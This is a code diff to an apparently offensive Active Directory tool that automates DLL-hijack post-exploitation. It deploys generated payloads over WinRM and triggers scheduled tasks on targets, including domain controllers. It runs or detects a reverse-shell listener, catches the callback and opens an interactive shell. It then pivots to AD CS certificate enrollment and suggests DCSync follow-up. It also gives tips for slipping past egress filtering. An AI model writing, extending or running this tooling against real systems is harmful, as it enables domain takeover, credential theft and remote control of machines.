@@ -1,7 +1,6 @@
 from __future__ import annotations
 
 import json
-import re
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -10,9 +9,22 @@ from typing import TYPE_CHECKING
 from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
 from admapper.postex.creds import resolve_winrm_cred
 from admapper.postex.deploy import deploy_dll_hijack
-from admapper.postex.listener import ReverseShellListener, start_listener
+from admapper.postex.monitor_log import (
+    build_monitor_log_script,
+    monitor_log_shows_new_activity,
+    read_monitor_log,
+    resolve_monitor_log_path,
+)
+from admapper.postex.listener import ReverseShellListener, ShellCapture, start_listener
+from admapper.postex.listener_marker import (
+    is_port_in_use,
+    read_listener_marker,
+    update_listener_connected,
+    write_listener_marker,
+)
 from admapper.postex.payload import PayloadMode
 from admapper.postex.pe_arch import TargetArch
+from admapper.postex.shell_client import parse_shell_username
 from admapper.support.output import print_info, print_success, print_warning
 from admapper.winrm.client import WinRMClient
 from admapper.winrm.factory import winrm_client_for_cred
@@ -117,47 +129,233 @@ def _load_scan(ws_path: Path) -> dict:
     return json.loads(path.read_text(encoding="utf-8"))
 
 
-def _monitor_log_script(intel_path: str | None, drop_path: str) -> str:
-    candidates: list[str] = []
-    if intel_path:
-        candidates.append(intel_path.replace("'", "''"))
-    base = drop_path.rstrip("\\/")
-    candidates.extend(
-        [
-            f"{base}\\Logs\\app.log",
-            f"{base}\\Logs\\service.log",
-            f"{base}\\Logs\\error.log",
-            f"{base}\\app.log",
-            f"{base}\\service.log",
-        ]
+def _enter_interactive_repl(
+    listener: ReverseShellListener,
+    session: Session,
+    *,
+    lport: int,
+    op_id: str | None = None,
+    auto_chain: bool | None = None,
+    expected_user: str | None = None,
+    skip_post_connect: bool = False,
+) -> None:
+    """Drop into the reverse-shell REPL on an already-connected listener."""
+    from admapper.postex.shell_client import ReverseShellRepl
+
+    print_success("entering interactive reverse-shell REPL (Ctrl+C to exit)")
+    try:
+        ReverseShellRepl(
+            listener,
+            session,
+            lport=lport,
+            op_id=op_id,
+            auto_chain=auto_chain,
+            expected_user=expected_user,
+        ).interact(skip_post_connect=skip_post_connect)
+    except KeyboardInterrupt:
+        print_info("REPL interrupted by user")
+
+
+def _print_shell_next_steps(session: Session, *, username: str) -> None:
+    """Actionable next steps after pivot shell (no password-based secretsdump)."""
+    if session.workspace is None:
+        return
+    workspace = session.workspace.name
+    domain = session.workspace.domain or "DOMAIN"
+    ws_path = session.workspaces.path_for(workspace)
+    print_info("next admapper commands:")
+    wsus_path = ws_path / "wsus_ops.json"
+    if wsus_path.is_file():
+        try:
+            import json
+
+            data = json.loads(wsus_path.read_text(encoding="utf-8"))
+            for item in data.get("opportunities") or []:
+                if str(item.get("id")) == "wsus-004" and item.get("ready"):
+                    print_info(
+                        f"    admapper postex wsus run -w {workspace}  "
+                        "(WSUS cert chain — no shell password needed)"
+                    )
+                    break
+        except (OSError, json.JSONDecodeError):
+            pass
+    print_info(
+        f"    admapper postex shell -w {workspace} --lport <callback-port>  "
+        "(reconnect if listener still up)"
     )
-    seen: set[str] = set()
-    checks: list[str] = []
-    for path in candidates:
-        key = path.lower()
-        if key in seen:
-            continue
-        seen.add(key)
-        checks.append(
-            f"if(Test-Path -LiteralPath '{path}')"
-            f"{{Get-Content -LiteralPath '{path}' -Tail 15;break}}"
+    print_info(
+        f"    DCSync needs DA/hash — {username} has no password from reverse shell; "
+        f"do not use secretsdump.py {domain}/{username}@<DC> without -hashes or -k"
+    )
+
+
+def _on_shell_captured(
+    session: Session,
+    *,
+    deploy_run_as_user: str,
+    probe_output: str,
+    enroll_template: str,
+    lport: int,
+    op_id: str | None,
+    listener: ReverseShellListener,
+    auto_chain: bool | None,
+    lightweight_followup: bool = False,
+) -> tuple[bool, str, str]:
+    """Handle pivot intel, workspace finalize, and listener marker after callback."""
+    print_success("shell probe output:")
+    print_info(probe_output[:1200])
+    _handle_pivot_shell(
+        session,
+        deploy_run_as_user,
+        probe_output,
+        enroll_template=enroll_template,
+        lightweight=lightweight_followup,
+    )
+    update_listener_connected(
+        session,
+        port=lport,
+        peer=listener.capture.peer,
+        op_id=op_id or "",
+    )
+
+    shell_user = deploy_run_as_user
+    parsed = parse_shell_username(probe_output)
+    if parsed:
+        shell_user = parsed
+
+    if shell_user and shell_user != "unknown":
+        print_success(f"shell user: {shell_user}")
+
+    return True, probe_output, shell_user
+
+
+def _external_handler_active(
+    session: Session,
+    lport: int,
+    *,
+    no_listener: bool,
+    payload_mode: str,
+    dry_run: bool,
+) -> bool:
+    if no_listener or dry_run or payload_mode != "shell":
+        return False
+    marker = read_listener_marker(session)
+    if not marker or int(marker.get("port", 0)) != lport:
+        return False
+    return is_port_in_use(lport)
+
+
+def emit_shell_timeout_diagnostics(
+    *,
+    callback_ip: str,
+    lport: int,
+    arch: str,
+    task_triggers: int,
+    monitor_log_tail: str = "",
+    export_name: str = "PreUpdateCheck",
+) -> None:
+    print_warning("shell timeout — check:")
+    lowered = monitor_log_tail.lower()
+    if "error code: 193" in lowered or "not a valid win32 application" in lowered:
+        alt = "x86" if arch != "x86" else "x64"
+        print_warning(
+            f"  · PE bitness mismatch (error 193) — applier rejected {arch} DLL; retry --arch {alt}"
         )
-    return ";".join(checks) if checks else "Write-Output 'no monitor log path'"
+    print_info(f"  · outbound TCP {lport} from DC to {callback_ip or '<LHOST>'} allowed?")
+    print_info("  · try --lport 443 or --lport 80 (common allowed ports)")
+    if "error code: 193" not in lowered:
+        print_info(f"  · try --arch x64 if target is a DC (current arch: {arch})")
+    if task_triggers:
+        print_info(
+            f"  · task triggered {task_triggers} time(s) — payload loads but shell not reaching listener"
+        )
+    if task_triggers and monitor_log_tail:
+        lowered = monitor_log_tail.lower()
+        export_lower = export_name.lower()
+        called_export = (
+            f"calling '{export_lower}" in lowered or f'calling "{export_lower}' in lowered
+        )
+        load_errors = ("error code:", "not found in", "failed to load")
+        if called_export and not any(err in lowered for err in load_errors):
+            print_info(
+                "  · export returned but no callback — rebuild with latest dllgen; "
+                "if persists try --lport 443 / 80 (egress filter)"
+            )
 
 
-def parse_shell_username(probe_output: str) -> str:
-    """Extract DOMAIN\\user or user from reverse-shell probe / whoami output."""
-    for line in probe_output.splitlines():
-        stripped = line.strip()
-        if not stripped or "whoami" in stripped.lower():
-            continue
-        exact = re.search(r"^([\w.-]+\\[\w$.-]+)\s*$", stripped, re.I)
-        if exact:
-            return exact.group(1).split("\\")[-1]
-        inline = re.search(r"\b([\w.-]+\\[\w$.-]+)\b", stripped, re.I)
-        if inline:
-            return inline.group(1).split("\\")[-1]
-    return ""
+def _prompt_extend_listen(*, task_triggers: int) -> bool:
+    if task_triggers:
+        print_info("task trigger detected — task IS running, shell not connecting back")
+    print_info("keep listener alive? (Ctrl+C to exit, Enter to wait another 180s)")
+    try:
+        input()
+        return True
+    except KeyboardInterrupt:
+        print_info("listener stopped by user")
+        return False
+
+
+def _poll_marker_connected(session: Session, lport: int, timeout: float) -> bool:
+    deadline = time.time() + max(timeout, 0)
+    while time.time() < deadline:
+        marker = read_listener_marker(session)
+        if (
+            marker
+            and int(marker.get("port", 0)) == lport
+            and marker.get("connected")
+        ):
+            return True
+        time.sleep(min(5.0, max(deadline - time.time(), 0.5)))
+    return False
+
+
+def _poll_wait_window(
+    *,
+    listener: ReverseShellListener | None,
+    client: WinRMClient,
+    script: str,
+    deploy_run_as_user: str,
+    wait_seconds: int,
+    external_handler: bool,
+    session: Session,
+    lport: int,
+    log_baseline: str = "",
+) -> tuple[bool, str, int]:
+    """Poll monitor logs and listener for one wait window."""
+    deadline = time.time() + max(wait_seconds, 0)
+    last_out = ""
+    poll_interval = 20
+    task_triggers = 0
+    while time.time() < deadline:
+        remaining = int(deadline - time.time())
+        if listener and listener.capture.connected:
+            listener.wait_probe(timeout=min(max(remaining, 1), 15.0))
+            return True, last_out, task_triggers
+        if external_handler and _poll_marker_connected(session, lport, min(poll_interval, remaining)):
+            return True, last_out, task_triggers
+        try:
+            last_out = read_monitor_log(client, script)
+            if monitor_log_shows_new_activity(last_out, log_baseline):
+                lowered = last_out.lower()
+                if "error code: 126" not in lowered or deploy_run_as_user.lower() in lowered:
+                    task_triggers += 1
+                    print_info("service log: new task activity")
+        except Exception as exc:
+            print_warning(f"monitor poll: {exc}")
+
+        if listener:
+            snap = listener.wait(timeout=min(poll_interval, max(remaining, 1)))
+            if snap.connected:
+                return True, last_out, task_triggers
+        elif external_handler:
+            if _poll_marker_connected(session, lport, min(poll_interval, max(remaining, 1))):
+                return True, last_out, task_triggers
+
+        if remaining <= 0:
+            break
+        print_info(f"waiting for shell / task ({remaining}s left) …")
+        time.sleep(min(poll_interval, remaining))
+    return False, last_out, task_triggers
 
 
 def _resolve_enroll_targets(session: Session) -> tuple[str, str, str]:
@@ -186,6 +384,7 @@ def _handle_pivot_shell(
     probe_output: str,
     *,
     enroll_template: str = "User",
+    lightweight: bool = False,
 ) -> None:
     """After shell as pivot target, show next escalate step and local AD CS enroll script."""
     parsed = parse_shell_username(probe_output)
@@ -199,6 +398,23 @@ def _handle_pivot_shell(
         else:
             return
     try:
+        from admapper.escalate.analyze import mark_user_owned
+
+        if lightweight:
+            mark_user_owned(session, effective_user, refresh=False, analyze=False)
+            print_info(
+                f"pivot → {effective_user} (shell only — no password/hash in credentials.json)"
+            )
+            print_info(
+                "LDAP phases bind as another owned user until you add creds for the pivot "
+                "(loot hash in shell, or admapper creds add)"
+            )
+            print_info(
+                "next: admapper postex shell -w <workspace> --lport <port>  "
+                "then run enum from the shell"
+            )
+            return
+
         from admapper.adcs.enroll import build_local_enroll_powershell, load_enroll_profile
         from admapper.adcs.runner import run_certipy_enrollment
         from admapper.escalate.analyze import run_escalate_analysis
@@ -219,6 +435,8 @@ def _handle_pivot_shell(
         ps = build_local_enroll_powershell(
             template=template,
             dns_name=enroll_dns,
+            ca_host=enroll_ca_host,
+            ca_name=enroll_ca_name,
             profile=profile,
             run_as_user=effective_user,
         )
@@ -254,6 +472,11 @@ def run_dll_hijack(
     enroll_ca_name: str | None = None,
     enroll_ca_host: str | None = None,
     auto_chain: bool | None = None,
+    keep_listener: bool = False,
+    max_wait_cycles: int | None = None,
+    auto_trigger_task: bool = False,
+    generator: str = "msfvenom",
+    interactive: bool = True,
 ) -> RunResult:
     """Fully automated: detect VPN IP, msfvenom, listener, deploy, poll, catch shell."""
     if session.workspace is None:
@@ -280,16 +503,39 @@ def run_dll_hijack(
     ws_path = session.workspaces.path_for(session.workspace.name)
     exclude = _target_ips(session)
     listener: ReverseShellListener | None = None
+    external_handler = _external_handler_active(
+        session,
+        lport,
+        no_listener=no_listener,
+        payload_mode=payload_mode,
+        dry_run=dry_run,
+    )
 
     try:
         if not no_listener and not dry_run and payload_mode == "shell":
-            if use_ncat:
+            if external_handler:
+                print_info(
+                    f"external handler detected on :{lport} — upload only, handler will catch callback"
+                )
+            elif use_ncat:
                 print_info(f"external listener required: ncat -lvnp {lport} on your LHOST")
             else:
+                print_info(f"Starting listener on port {lport}")
                 print_info(
-                    f"starting built-in reverse-shell listener on 0.0.0.0:{lport} (set ADMAPPER_LHOST)"
+                    f"starting built-in reverse-shell listener on 0.0.0.0:{lport} "
+                    "(set ADMAPPER_LHOST)"
                 )
-            listener = start_listener(lport, use_ncat=use_ncat)
+                listener = start_listener(lport, use_ncat=use_ncat)
+                if isinstance(listener, ReverseShellListener):
+                    from admapper.postex.shell_client import register_active_listener
+
+                    register_active_listener(session.workspace.name, lport, listener)
+                    write_listener_marker(
+                        session,
+                        port=lport,
+                        op_id=op_id or "",
+                        connected=False,
+                    )
 
         deploy = deploy_dll_hijack(
             session,
@@ -306,6 +552,7 @@ def run_dll_hijack(
             enroll_dns=enroll_dns,
             enroll_ca_name=enroll_ca_name,
             enroll_ca_host=enroll_ca_host,
+            generator=generator,  # type: ignore[arg-type]
         )
 
         if dry_run:
@@ -321,14 +568,7 @@ def run_dll_hijack(
         scan = _load_scan(ws_path)
         finding = (scan.get("findings") or [{}])[0]
         drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
-        monitor_path = None
-        excerpt = str(scan.get("monitor_log_excerpt") or "")
-        for line in excerpt.splitlines():
-            if ".log" in line.lower() and ":\\" in line:
-                for part in line.split():
-                    if part.lower().endswith(".log") and ":\\" in part:
-                        monitor_path = part.strip("'\"")
-                        break
+        monitor_path = resolve_monitor_log_path(scan, drop_path)
 
         cred = resolve_winrm_cred(
             session,
@@ -338,85 +578,120 @@ def run_dll_hijack(
         )
         client = _winrm_client_from_cred(cred, session)
 
-        script = _monitor_log_script(monitor_path, drop_path)
-        deadline = time.time() + max(wait_seconds, 0)
-        last_out = ""
-        poll_interval = 20
-        while time.time() < deadline:
-            remaining = int(deadline - time.time())
-            if listener and listener.capture.connected:
-                break
-            try:
-                proc = client.execute(script, shell="powershell")
-                last_out = (proc.stdout or "").strip()
-                if last_out and last_out != "no monitor log path":
-                    lowered = last_out.lower()
-                    if "error code: 126" not in lowered or deploy.run_as_user.lower() in lowered:
-                        print_info("service log: task activity detected")
-            except Exception as exc:
-                print_warning(f"monitor poll: {exc}")
-
-            if listener:
-                snap = listener.wait(timeout=min(poll_interval, max(remaining, 1)))
-                if snap.connected:
-                    break
-
-            if remaining <= 0:
-                break
-            print_info(f"waiting for shell / task ({remaining}s left) …")
-            time.sleep(min(poll_interval, remaining))
-
+        script = build_monitor_log_script(monitor_path, drop_path)
         shell_connected = False
         shell_output = ""
-        callback_ip = deploy.callback_ip or lhost or ""
-        if listener:
-            cap = listener.capture
-            shell_connected = cap.connected
-            shell_output = cap.output
-            if cap.connected and cap.output:
-                print_success("shell probe output:")
-                print_info(cap.output[:1200])
-                _handle_pivot_shell(
-                    session,
-                    deploy.run_as_user,
-                    cap.output,
-                    enroll_template=enroll_template,
-                )
-
         shell_user = deploy.run_as_user
-        if shell_connected and shell_output:
-            parsed = parse_shell_username(shell_output)
-            if parsed:
-                shell_user = parsed
-
-        if shell_connected and shell_user and shell_user != "unknown":
+        callback_ip = deploy.callback_ip or lhost or ""
+        last_out = ""
+        task_triggers = 0
+        wait_cycle = 0
+        if auto_trigger_task and deploy.task_name:
             try:
-                from admapper.engage.auto import finalize_postex_shell
+                client.execute(f'schtasks /run /tn "{deploy.task_name}"', shell="cmd")
+                print_info(f"triggered scheduled task: {deploy.task_name}")
+            except Exception as exc:  # noqa: BLE001
+                print_warning(f"task trigger failed ({deploy.task_name}): {exc}")
+        log_baseline = read_monitor_log(client, script)
+        interactive_listener: ReverseShellListener | None = None
+        if listener and isinstance(listener, ReverseShellListener):
+            interactive_listener = listener
 
-                finalize_postex_shell(
-                    session,
-                    username=shell_user,
-                    probe_output=shell_output,
-                    auto_chain=auto_chain,
-                )
-            except Exception as exc:
-                print_warning(f"postex finalize: {exc}")
-                if session.workspace and shell_user not in session.workspace.owned_users:
-                    from admapper.escalate.analyze import mark_user_owned, record_escalation_step
-
-                    mark_user_owned(session, shell_user, refresh=False)
-                    record_escalation_step(
-                        session,
-                        action="dll_hijack_shell",
-                        detail=f"postex → {shell_user}",
+        while not shell_connected:
+            shell_connected, last_out, task_triggers = _poll_wait_window(
+                listener=listener,
+                client=client,
+                script=script,
+                deploy_run_as_user=deploy.run_as_user,
+                wait_seconds=wait_seconds,
+                external_handler=external_handler,
+                session=session,
+                lport=lport,
+                log_baseline=log_baseline,
+            )
+            if shell_connected:
+                break
+            print_warning(f"no reverse shell within {wait_seconds}s — task may need more time")
+            if last_out:
+                print_info("service log (last poll):")
+                for line in last_out.splitlines()[-8:]:
+                    print_info(f"  {line}")
+                if "error code: 193" in last_out.lower():
+                    print_warning(
+                        "PE bitness mismatch (error 193) — rebuild payload with --arch x86 "
+                        "(32-bit applier cannot load x64 DLL)"
                     )
-                    session.persist_workspace()
-                    print_success(f"added owned user: {shell_user}")
+            emit_shell_timeout_diagnostics(
+                callback_ip=callback_ip,
+                lport=lport,
+                arch=deploy.target_arch,
+                task_triggers=task_triggers,
+                monitor_log_tail=last_out,
+            )
+            wait_cycle += 1
+            extend = keep_listener and (
+                max_wait_cycles is None or wait_cycle < max_wait_cycles
+            )
+            extend = extend or (
+                interactive and _prompt_extend_listen(task_triggers=task_triggers)
+            )
+            if extend:
+                if keep_listener and max_wait_cycles is not None:
+                    remaining = max_wait_cycles - wait_cycle
+                    print_info(
+                        f"dashboard listener: waiting another {wait_seconds}s "
+                        f"({remaining} cycle(s) left)"
+                    )
+                write_listener_marker(
+                    session,
+                    port=lport,
+                    op_id=op_id or "",
+                    connected=False,
+                )
+                continue
+            break
+
+        cap = listener.capture if listener else ShellCapture()
+        if shell_connected and external_handler and not cap.connected:
+            marker = read_listener_marker(session) or {}
+            peer = marker.get("peer") or "unknown"
+            print_success(f"shell connected on external handler from {peer}")
+            print_info(
+                f"use the handler terminal for REPL — or: admapper postex shell -w {session.workspace.name}"
+            )
+        elif cap.connected and interactive_listener:
+            shell_connected, shell_output, shell_user = _on_shell_captured(
+                session,
+                deploy_run_as_user=deploy.run_as_user,
+                probe_output=cap.output,
+                enroll_template=enroll_template,
+                lport=lport,
+                op_id=op_id,
+                listener=interactive_listener,
+                auto_chain=auto_chain,
+                lightweight_followup=not interactive,
+            )
+        elif keep_listener and listener:
+            print_info("still listening for reverse shell ...")
+            cap = listener.wait(timeout=30.0)
+            if cap.connected and interactive_listener:
+                shell_connected, shell_output, shell_user = _on_shell_captured(
+                    session,
+                    deploy_run_as_user=deploy.run_as_user,
+                    probe_output=cap.output,
+                    enroll_template=enroll_template,
+                    lport=lport,
+                    op_id=op_id,
+                    listener=interactive_listener,
+                    auto_chain=auto_chain,
+                    lightweight_followup=not interactive,
+                )
 
         enroll_success = False
         enroll_log_excerpt = ""
         enroll_errors: list[str] = []
-        pfx_remote = f"{drop_path.rstrip('\\/')}\\{enroll_dns}.pfx"
+        drop_base = drop_path.rstrip("\\/")
+        pfx_remote = f"{drop_base}\\{enroll_dns}.pfx"
         if payload_mode == "enroll" and not dry_run:
             enroll_success, enroll_log_excerpt, enroll_errors = _poll_enroll_outcome(
                 client,
@@ -456,12 +731,44 @@ def run_dll_hijack(
                     for line in enroll_log_excerpt.splitlines()[-10:]:
                         print_info(f"  {line}")
 
-        if not shell_connected and listener:
-            print_warning(f"no reverse shell within {wait_seconds}s — task may need more time")
-            if last_out:
-                print_info("service log (last poll):")
-                for line in last_out.splitlines()[-8:]:
-                    print_info(f"  {line}")
+        if (
+            shell_connected
+            and interactive_listener
+            and interactive_listener.capture.connected
+            and not dry_run
+            and payload_mode == "shell"
+        ):
+            chain = auto_chain
+            if chain is None and session.workspace and interactive:
+                from admapper.support.session import OperationMode
+
+                chain = session.workspace.mode == OperationMode.AUTO
+            if chain and shell_user and shell_user != "unknown":
+                from admapper.engage.auto import finalize_postex_shell
+
+                finalize_postex_shell(
+                    session,
+                    username=shell_user,
+                    probe_output=shell_output,
+                    auto_chain=True,
+                )
+            _print_shell_next_steps(session, username=shell_user or deploy.run_as_user)
+            if interactive:
+                _enter_interactive_repl(
+                    interactive_listener,
+                    session,
+                    lport=lport,
+                    op_id=op_id,
+                    auto_chain=auto_chain,
+                    expected_user=shell_user or deploy.run_as_user,
+                    skip_post_connect=True,
+                )
+            else:
+                workspace = session.workspace.name if session.workspace else ""
+                print_success(
+                    f"Interactive shell ready — use the shell prompt below or: "
+                    f"admapper postex shell -w {workspace} --lport {lport}"
+                )
 
         return RunResult(
             deploy_remote_path=deploy.remote_path,
@@ -477,4 +784,20 @@ def run_dll_hijack(
         )
     finally:
         if listener is not None:
-            listener.close()
+            keep_open = (
+                not interactive
+                and isinstance(listener, ReverseShellListener)
+                and listener.capture.connected
+            )
+            if keep_open:
+                listener.persist()
+                if session.workspace and isinstance(listener, ReverseShellListener):
+                    from admapper.postex.shell_client import register_active_listener
+
+                    register_active_listener(session.workspace.name, lport, listener)
+            else:
+                if session.workspace and isinstance(listener, ReverseShellListener):
+                    from admapper.postex.shell_client import unregister_active_listener
+
+                    unregister_active_listener(session.workspace.name, lport)
+                listener.close()
